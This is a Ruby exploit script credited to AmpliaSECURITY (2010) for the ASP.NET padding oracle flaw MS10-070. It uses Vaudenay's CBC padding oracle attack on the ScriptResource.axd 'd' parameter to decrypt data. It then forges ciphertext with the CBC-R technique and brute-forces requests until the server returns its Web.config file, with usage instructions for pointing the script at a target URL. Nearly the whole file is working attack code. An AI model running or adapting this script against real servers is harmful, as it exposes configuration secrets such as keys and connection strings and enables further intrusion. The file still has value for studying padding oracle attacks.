#!/usr/bin/ruby -w

#
#  aspx_po_chotext_attack.rb
#
#  Copyright (c) 2010 AmpliaSECURITY. All rights reserved
#
#  http://www.ampliasecurity.com
#  Agustin Azubel - aazubel@ampliasecurity.com
#
#
#  MS10-070 ASPX proof of concept
#    Decrypt data using Vaudenay's cbc-padding-oracle-side-channel
#    Encrypt data using Rizzo-Duong CBC-R technique
#
# Copyright (c) 2010 Amplia Security. All rights reserved.
#
# Unless you have express writen permission from the Copyright
# Holder, any use of or distribution of this software or portions of it,
# including, but not limited to, reimplementations, modifications and derived
# work of it, in either source code or any other form, as well as any other
# software using or referencing it in any way, may NOT be sold for commercial
# gain, must be covered by this very same license, and must retain this
# copyright notice and this license.
# Neither the name of the Copyright Holder nor the names of its contributors
# may be used to endorse or promote products derived from this software
# without specific prior written permission.
#
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#


$debugging = false


require 'net/http'
require 'uri'
require 'rexml/document'


#<require 'xarray'>
module XArray
  def hex_inspect
    "[#{length}][ #{map { |x| x.hex_inspect }.join ", " } ]"
  end
end

class Array
  include XArray
end
#</require 'xarray'>


#<require 'xbase64'>
require 'base64'

class XBase64
  def self.encode s
    s = Base64.encode64 s
    s = s.gsub '+', '-'
    s = s.gsub '/', '_'
    s = s.gsub "\n", ''
    s = s.gsub "\r", ''

    s = XBase64.encode_base64_padding s
  end

  def self.encode_base64_padding s
    padding_length = 0
    padding_length += 1 while s[-1 - padding_length, 1] == "="
    s[0..(-1 - padding_length)] + padding_length.to_s
  end


  def self.decode s
    s = s.gsub '-', '+'
    s = s.gsub '_', '/'

    s = self.decode_base64_padding s

    Base64.decode64 s
  end

  def self.decode_base64_padding s
    padding_length = s[-1,1].to_i
    s[0...-1] + ("=" * padding_length)
  end
end
#</require 'xbase64'>


#<require 'xstring'>
module XString
  def xor other
    raise RuntimeError, "length mismatch" if self.length != other.length
    (0...length).map { |i| self[i] ^ other[i] }.map { |x| x.chr }.join
  end
  alias ^ :xor

  def hex_inspect
    printables = [ "\a", "\b", "\e", "\f", "\n", "\r", "\t", "\v" ] + \
                 (0x20..0x7e).entries

    "[#{length}]" + "\"#{unpack("C*").map { |x|
                      printables.include?(x) ? x.chr : "\\x%02x" % x }.join}\""
  end

  def to_blocks blocksize
    (0...length/blocksize).map { |i| self[blocksize * i, blocksize]}
  end
end

class String
  include XString
end
#</require 'xstring'>


#<require 'padding_verification_strategy'>
class PaddingVerificationStrategy
  def initialize parameters
    @parameters = parameters
  end

  def valid_padding?
    raise RuntimeError, "abstract method !"
  end
end

class ErrorCodeStrategy < PaddingVerificationStrategy
  def valid_padding? response
    invalid_padding_error_code = @parameters[:invalid_padding_error_code]
    not (invalid_padding_error_code == response.code)
  end
end

class BodyLengthStrategy < PaddingVerificationStrategy
  def valid_padding? response
    invalid_padding_body_length = @parameters[:invalid_padding_body_length]
    absolute_error = @parameters[:absolute_error]

    not ( (invalid_padding_body_length - response.body.length).abs < absolute_error)
  end
end

class BodyContentStrategy < PaddingVerificationStrategy
  def valid_padding?
  end
end

class TimingStrategy < PaddingVerificationStrategy
  def valid_padding?
  end
end
#</require 'padding_verification_strategy'>


#<require 'padding_oracle_decryptor'>
class PaddingOracleDecryptor
  attr_accessor :blocksize
  attr_accessor :d_value
  attr_accessor :http
  attr_accessor :strategy

  def initialize
    @tries = 0
    @a = []
    @decrypted = []
    @blocksize = nil
    @d_value = nil
    @http = nil
    @strategy = nil
  end


  def discover_blocksize_and_oracle_behaviour
    puts "discovering blocksize and oracle behaviour..."

    [ 16, 8 ].each do |b|
      ciphertext = @d_value.clone
      ciphertext[-(b * 3)] ^= 0x01

      response = http.send_request ciphertext

      valid_padding_code = response.code
      valid_padding_body_length = response.body.length

      0.upto b - 1 do |i|
        ciphertext = @d_value.clone
        ciphertext[-(b * 2) + i] ^= 0x01

        response = http.send_request ciphertext

#        puts "code: #{response.code}, length: #{response.body.length}"

#        if valid_padding_code != response.code
#          puts "padding verification strategy based on error code"
#          @strategy = ErrorCodeStrategy.new :valid_padding_code => valid_padding_code,
#                                            :invalid_padding_code => response.code
#          @blocksize = b
#          break
#        end

        if valid_padding_body_length != response.body.length
          absolute_error = 200
          if (valid_padding_body_length - response.body.length).abs > absolute_error
            puts "padding verification strategy based on body length"
            @strategy = BodyLengthStrategy.new :valid_padding_body_length => valid_padding_body_length,
                                               :invalid_padding_body_length => response.body.length,
                                               :absolute_error => absolute_error
            @blocksize = b
            break
          end
        end
      end
      break if blocksize
    end

    raise RuntimeError, "could not select a valid padding verification strategy!" unless blocksize

    puts "discovered blocksize: #{blocksize}"
    # blocksize and  padding_length leads to automatic tail decryption !

    blocksize
  end

  def valid_padding? response
    strategy.valid_padding? response
  end

  def ask_oracle r
    @tries += 1
    r = r[1..-1].pack "C" * blocksize

    ciphertext = d_value + r + @y

    response = http.send_request ciphertext

    return 1 if valid_padding? response

    return 0
  end

  def decrypt_last_word
    print "last word... "
    $stdout.flush

    b = blocksize

    # 1. pick a few random words r[1],...,r[b] and take i = 0
    saved_r = [0]
    saved_r += (1..b).map { |i| rand 0xff }
    i = 1
    loop do
      r = saved_r.clone

      # 2. pick r = r[1],...,r[b-1],(r[b] xor i)
      r[b] = r[b] ^ i

      # 3. if O(r|y) = 0 then increment i and go back to the previous step
      break if ask_oracle(r) == 1
      i += 1
      raise "failed!" if i > 0xff
    end

    # 4. replace r[b] by r[b xor i]
    saved_r[b] = saved_r[b] ^ i

    # 5. for n = b down to 2 do
    #      (a) take r = r[1],...,r[b-n],(r[b-n+1] xor 1),r[b-n+2],...,r[b]
    #      (b) if O(r|y) = 0 then stop and output (r[b-n+1] xor n),...,r[b xor n]
    b.downto 2 do |n|
      r = saved_r.clone
      r[b-n+1] = r[b-n+1] ^ 1
      if ask_oracle(r) == 0
#        puts "lucky #{n}!"
        n.downto(1) do |t|
          word = r[b-t+1] ^ n
          @a[b-t+1] = word
          puts "a[#{b-t+1}]: #{word}"
        end
        return
      end
    end
    r = saved_r.clone

    # 6. output r[b] xor 1
    last_word = r[b] ^ 1
    @a[blocksize] = last_word
#    puts "\x07a[#{blocksize}]: 0x%02x" % @a[blocksize]
  end

  def decrypt_ax x
    print "a[#{x}]... "
    $stdout.flush

    b = blocksize
    j = x+1
    saved_r = [ 0 ]

    # 2. pick r[1],...,r[j-1] at random and take i = 0
    saved_r += (1..x).map { |i| rand 0xff }
    i = 0

    # 1. take r[k] = a[k] xor ( b - j + 2) for k = j,...,b
    2.upto b do |k|
      saved_r[k] = @a[k] ^ (b - j + 2) if x < k
    end

    loop do
      r = saved_r.clone

      # 3. take r = r[1]...r[j-2](r[j-1] xor i)r[j]..r[b]
      r[x] = r[x] ^ i


      # 4. if O(r|y) = 0 then increment i and go back to the previous step
      break if (ask_oracle r) == 1
      i += 1
      raise "failed!" if i > 255
    end

    r = saved_r.clone

    # 5. output r[j-1] xor i xor (b - j + 2)
    @a[x] = (r[x] ^ i) ^ (b - j + 2)
#    puts "\x07a[#{x}]: 0x%02x" % @a[x]
  end


  def decrypt_block iv, y
    @tries = 0
    @iv = iv
    @y = y

    print "decrypting "
    $stdout.flush

    decrypt_last_word
    (blocksize - 1).downto 1 do |j|
      decrypt_ax j
    end

    puts
    puts "tries: #{@tries}, average: #{(blocksize * 256) / 2}"
    @a.shift

    plaintext_block = (0...blocksize).map { |i| @a[i] ^ @iv[i] }.pack "C*"

    plaintext_block
  end

  def decrypt ciphertext
    plaintext_blocks = Array.new
    cipher_blocks = ciphertext.to_blocks blocksize

    iv = "\x00" * blocksize
    cipher_blocks.unshift iv

    1.upto cipher_blocks.length - 2  do |i|
      plaintext_block = decrypt_block cipher_blocks[-i - 1], cipher_blocks[-i]
      plaintext_blocks.unshift plaintext_block
    end

    plaintext_blocks.join
  end
end
#</require 'padding_oracle_decryptor'>


class ASPXPaddingOracleChosenCiphertextAttack
  attr_reader :uri
  attr_reader :filename
  attr_reader :filelength
  attr_reader :filere
  attr_reader :http
  attr_reader :d_value
  attr_reader :blocksize
  attr_reader :axdpath
  attr_reader :axdname
  attr_reader :decryptor
  attr_reader :base_mask

  def initialize parameters
    @uri = URI.parse parameters[:uri]
    @filename = parameters[:filename]
    @filelength = parameters[:filelength]
    @filere = parameters[:filere]
    @http = http_initialize
    @d_value = nil
    @base_mask = rand 0xffff
    @blocksize = nil
    @axdpath = nil
    @axdname = nil
    @decryptor = PaddingOracleDecryptor.new

    puts "using target: #{@uri}"
    puts "using base_mask: 0x%04x" % @base_mask
  end

  def http_initialize
    http = Net::HTTP.new @uri.host, @uri.port
    http
  end


  def parse_script_tag xml, re
    d = nil

    doc = REXML::Document.new xml
    doc.elements.each 'script' do |e|
      src_attribute = e.attributes['src']
      md = re.match src_attribute
      d = md[1]
      break
    end

    raise RuntimeError, "could not parse script_tag" unless d

    d
  end
  private :parse_script_tag

  def get_ciphertext_sample
    puts "starting connection..."

    http.start

    [ [ "ScriptResource.axd", /\/ScriptResource\.axd\?d=([a-zA-Z0-9\-\_]+)\&t=[a-z0-9]+/ ]
    ].each do |name, re|

        headers = { 'User-Agent' => \
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)' }

        response = http.get uri.path, headers
        body = response.body

        script_tags = body.lines.select { |x| x.index name }

        next if script_tags.empty?

#        puts "script tags using #{name} [#{script_tags.length}]:"
#        puts script_tags.map { |x| "\t#{x}" }

        d = parse_script_tag script_tags[0], re

        puts "using script: #{name}"
        puts "using d_value: #{d}"

        @axdpath = uri.path[0, uri.path.rindex('/')]
        @axdname = name
        @d_value = ("\x00" * 16) + (XBase64.decode d)
        break
    end

    raise RuntimeError, "could not find any axd sample" unless d_value

    decryptor.http = self
    decryptor.d_value = d_value

    d_value
  end

  def parse_html_body h, body
    parsed = String.new

    doc = REXML::Document.new body
    doc.elements.each h do |e|
      parsed = e.text
      break
    end

    parsed
  end

  def send_request d
    request = Net::HTTP::Get.new "/#{axdpath}/#{axdname}?d=#{XBase64.encode d}"
    request['Connection'] = 'Keep-Alive'
    @http.request request
  end

  def decrypt ciphertext
    decryptor.decrypt ciphertext
  end


  def discover_blocksize_and_oracle_behaviour
    @blocksize = decryptor.discover_blocksize_and_oracle_behaviour
  end

  def reallocate_cipher_blocks cipher_blocks, new_plaintext_blocks
    puts "cipher_blocks.count: #{cipher_blocks.count}"

    required_block_count = 1 + new_plaintext_blocks.length + 1
    puts "required_block_count: #{required_block_count}"

    if required_block_count < cipher_blocks.count then
      delta = cipher_blocks.count - required_block_count
      puts "removing #{delta} extra blocks..."
      cipher_blocks = [ cipher_blocks[0] ] + cipher_blocks[-required_block_count+1..-1]
    elsif required_block_count > cipher_blocks.count then
      delta = required_block_count - cipher_blocks.count
      puts "adding #{delta} extra_blocks..."
      cipher_blocks = [ cipher_blocks[0], ("\x00" * blocksize) * delta ] + cipher_blocks[1..-1]
    end

    puts "cipher_blocks.count: #{cipher_blocks.count}"

    cipher_blocks
  end
  private :reallocate_cipher_blocks

  def generate_new_plaintext_blocks
    tail_padding = "\x01"
    head_padding_length = blocksize - ( (@filename.length + tail_padding.length) % blocksize)
    head_padding_length = 0 if head_padding_length == blocksize
    head_padding = "\x00" * head_padding_length
    new_plaintext = head_padding + @filename + tail_padding

    new_plaintext.to_blocks blocksize
  end
  private :generate_new_plaintext_blocks

  def encrypt
    puts "encrypting \"#{@filename.hex_inspect}..."

    new_plaintext_blocks = generate_new_plaintext_blocks

    cipher_blocks = @d_value.to_blocks blocksize
    cipher_blocks = reallocate_cipher_blocks cipher_blocks, new_plaintext_blocks

    puts "decrypting #{new_plaintext_blocks.length} blocks..."
    (1..new_plaintext_blocks.length).each do |i|
      puts "block #{i} of #{new_plaintext_blocks.length}"

      old_plaintext_block = decryptor.decrypt_block cipher_blocks[-i - 1], cipher_blocks[-i]
      puts "old_plaintext_block: #{old_plaintext_block.hex_inspect}"

      cipher_blocks[-1 - i] ^= old_plaintext_block ^ new_plaintext_blocks[-i]
    end

    puts "eye candy: decrypting crafted ciphertext"
    new_plaintext = decrypt cipher_blocks.join
    puts "new_plaintext: #{new_plaintext.hex_inspect}"


    @d_value = cipher_blocks.join
  end


  def discover_escape_sequence
    puts "discovering escape sequence..."

    escape_sequence_mask = nil

    offset = base_mask % (blocksize - 4)

    ciphertext = d_value.clone
    0x1ffff.times do |mask|
      ciphertext[offset, 4] = [ base_mask + mask ].pack "L"

      response = send_request ciphertext
      print "\rtrying escape_mask: 0x%05x/0x1ffff, http_code: %4d, body_length: %5d" % \
                                  [  mask,                    response.code,   response.body.length ]

      next unless response.code == "200"

      next if filelength and (response.body.length < filelength)

      next if filere and (not filere =~ response.body)

      escape_sequence_mask = base_mask + mask

      puts
      puts "found!"
      puts "press any key to show the contents of the file"
      $stdin.gets
      puts response.body
      break
    end

    raise RuntimeError, "no more combinations to try !" unless escape_sequence_mask

    escape_sequence_mask
  end

  def pause
    puts
    puts "press any key to start the attack"
    $stdin.gets
  end

  def run
    get_ciphertext_sample
    pause
    discover_blocksize_and_oracle_behaviour
    encrypt
    discover_escape_sequence
  end
end



puts [ "-------------------------------------------",
       "aspx_po_chotext_attack.rb",
       "(c) 2010 AmpliaSECURITY",
       "http://www.ampliasecurity.com",
       "Agustin Azubel - aazubel@ampliasecurity.com",
       "-------------------------------------------",
       "\n" ].join "\n"


if ARGV.length != 1 then
  $stderr.puts "usage: ruby #{$PROGRAM_NAME} http://192.168.1.1/Default.aspx"
  exit
end

begin
  parameters = {
    :uri => ARGV.first,
    :filename => "|||~/Web.config",
    :filere => /configuration/
  }

  x = ASPXPaddingOracleChosenCiphertextAttack.new parameters
  x.run
rescue Exception => e
  $stderr.puts "Exploit failed: #{e}"

  raise if $debugging
end